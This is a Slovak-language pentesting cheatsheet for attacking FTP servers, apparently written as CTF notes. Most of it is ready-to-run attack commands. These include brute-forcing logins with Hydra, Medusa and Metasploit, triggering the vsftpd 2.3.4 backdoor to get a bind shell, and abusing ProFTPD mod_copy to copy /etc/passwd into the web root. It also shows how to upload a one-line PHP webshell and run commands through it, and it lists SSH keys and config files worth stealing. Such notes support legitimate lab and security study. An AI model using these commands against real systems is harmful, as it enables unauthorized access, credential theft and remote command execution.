---
layout: notes
title: "FTP (Port 21)"
folder: "Ports"
tags: [ftp, enumeration, bruteforce, ctf, pentesting]
description: "FTP cheatsheet – enumeration, anonymous login, bruteforce, vsftpd backdoor a ďalšie techniky."
---

# FTP (Port 21) – Cheatsheet

## Enumeration

```bash
nmap -sV -sC -p 21 <IP>
nmap --script=ftp-anon,ftp-brute -p 21 <IP>
nmap --script=ftp-* -p 21 <IP>

# Banner grabbing
nc -nv <IP> 21
telnet <IP> 21
```

---

## Anonymous Login

```bash
ftp <IP>
# Username: anonymous
# Password: anonymous  alebo prázdne (Enter)

# Alebo priamo
ftp anonymous@<IP>
```

---

## Po prihlásení (FTP príkazy)

```bash
ls -la          # zoznam súborov vrátane skrytých
pwd             # aktuálny adresár
cd /pub         # zmeniť adresár
get file.txt    # stiahni súbor
mget *          # stiahni všetko (potvrdenie pre každý)
mget -i *       # stiahni všetko bez potvrdenia

put shell.php   # nahraj súbor (ak je zápis povolený)
mput *          # nahraj viac súborov

binary          # prepni na binárny prenos (exe, zip, img...)
ascii           # prepni na ASCII prenos (txt, html...)
passive         # prepni do passive mode
prompt          # vypni interaktívne potvrdenie pri mget/mput

delete file     # zmazať súbor
mkdir dir       # vytvoriť adresár
bye / quit      # odpojiť sa
```

---

## Stiahnutie celého FTP rekurzívne

```bash
# wget – celý FTP anonymne
wget -r ftp://anonymous:anonymous@<IP>/

# wget – s credentialmi
wget -r ftp://<user>:<pass>@<IP>/

# curl
curl -u anonymous:anonymous ftp://<IP>/ --list-only
curl -u anonymous:anonymous -O ftp://<IP>/file.txt
```

---

## Bruteforce

```bash
# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP>
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://<IP> -t 4
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP> -V -f

# Medusa
medusa -h <IP> -u admin -P /usr/share/wordlists/rockyou.txt -M ftp

# Nmap brute
nmap --script ftp-brute -p 21 <IP>

# Metasploit
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <IP>
set USER_FILE users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

---

## vsftpd 2.3.4 – Backdoor (CVE-2011-2523)

```bash
# Identifikácia verzie
nmap -sV -p 21 <IP>
# hľadaj: vsftpd 2.3.4

# Backdoor sa spustí ak dáš :) na konci username
# Otvorí bind shell na porte 6200

# Exploit – Metasploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <IP>
run

# Manuálne
nc <IP> 21
USER backdoor:)
PASS anything
# potom v druhom terminali:
nc <IP> 6200
```

---

## ProFTPD – Exploity

```bash
# ProFTPD 1.3.5 – mod_copy (CVE-2015-3306)
# Umožňuje kopírovanie súborov bez autentifikácie
nc <IP> 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
# potom: curl http://<IP>/passwd.txt

# Metasploit
use exploit/unix/ftp/proftpd_133c_backdoor
```

---

## Upload Webshell (ak je zápis povolený)

```bash
# 1. Zisti cestu webu (skús /var/www/html, /srv/http ...)

# 2. Nahraj shell
ftp <IP>
cd /var/www/html
put shell.php

# PHP webshell (minimálny)
# obsah súboru shell.php:
# <?php system($_GET['cmd']); ?>

# 3. Spusti
curl http://<IP>/shell.php?cmd=id
curl http://<IP>/shell.php?cmd=whoami
```

---

## FTP cez SSL/TLS (FTPS)

```bash
# Overenie či server podporuje TLS
nmap --script ftp-syst -p 21 <IP>

# Pripojenie cez lftp
lftp -u <user>,<pass> ftps://<IP>
lftp -e "set ftp:ssl-force true" -u <user>,<pass> ftp://<IP>

# OpenSSL – manuálne
openssl s_client -connect <IP>:21 -starttls ftp
```

---

## Zaujímavé súbory na FTP

```bash
.bash_history       # história príkazov
.ssh/id_rsa         # SSH privátny kľúč
.ssh/authorized_keys
/etc/passwd
wp-config.php       # WordPress konfigurácia
config.php
*.conf  *.key  *.bak  *.old  *.zip  *.tar.gz
```

---

## Časté zraniteľnosti

| Zraniteľnosť | Nástroj / Technika |
|---|---|
| Anonymous login | `ftp anonymous@<IP>` |
| Slabé credentials | Hydra / Medusa |
| vsftpd 2.3.4 backdoor | Metasploit / manuálne |
| ProFTPD mod_copy | Metasploit / nc |
| Writeable adresár | Upload webshell |
| Cleartext prenos | Wireshark / tcpdump |

---

## Metasploit – pomocné moduly

```bash
use auxiliary/scanner/ftp/ftp_version     # verzia FTP servera
use auxiliary/scanner/ftp/anonymous       # test anonymous loginu
use auxiliary/scanner/ftp/ftp_login       # bruteforce
```
